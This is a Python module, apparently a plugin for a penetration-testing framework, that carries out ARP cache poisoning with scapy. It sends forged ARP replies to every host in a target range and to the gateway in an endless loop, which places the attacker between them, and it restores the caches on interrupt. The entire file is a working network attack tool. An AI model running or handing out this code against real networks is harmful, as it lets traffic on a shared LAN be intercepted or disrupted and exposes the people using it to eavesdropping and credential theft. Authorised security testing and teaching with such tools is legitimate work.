import ipaddress

from scapy.layers.l2 import ARP
from scapy.sendrecv import send

from module import Module, Type
from utils.network import get_mac


def spoof(target_ip: str, spoof_ip: str, timeout: float):
    pkt = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip, timeout), psrc=spoof_ip)
    send(pkt, verbose=False)


def restore(destination_ip: str, source_ip: str, timeout: float):
    destination_mac = get_mac(destination_ip, timeout)
    source_mac = get_mac(source_ip, timeout)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)


class ARPSpoofing(Module):

    def __init__(self):
        super().__init__("arp_spoofing",
                         ["arp", "spoof", "spoofing", "poisoning"],
                         "arp spoofing")

        self.add_option("RHOSTS", "target hosts", required=True, type=Type.string)
        self.add_option("GATEWAY", "gateway ip", required=True, type=Type.string)
        self.add_option("TIMEOUT", "timeout", required=True, default=5, type=Type.float)

    def run(self):
        try:
            while True:
                for target_ip in ipaddress.IPv4Network(self.rhosts, False).hosts():
                    if target_ip != self.gateway:
                        spoof(str(target_ip), self.gateway, self.timeout)
                        spoof(self.gateway, str(target_ip), self.timeout)
        except KeyboardInterrupt:
            for target_ip in ipaddress.IPv4Network(self.rhosts, False).hosts():
                if target_ip != self.gateway:
                    restore(str(target_ip), self.gateway, self.timeout)
                    restore(self.gateway, str(target_ip), self.timeout)
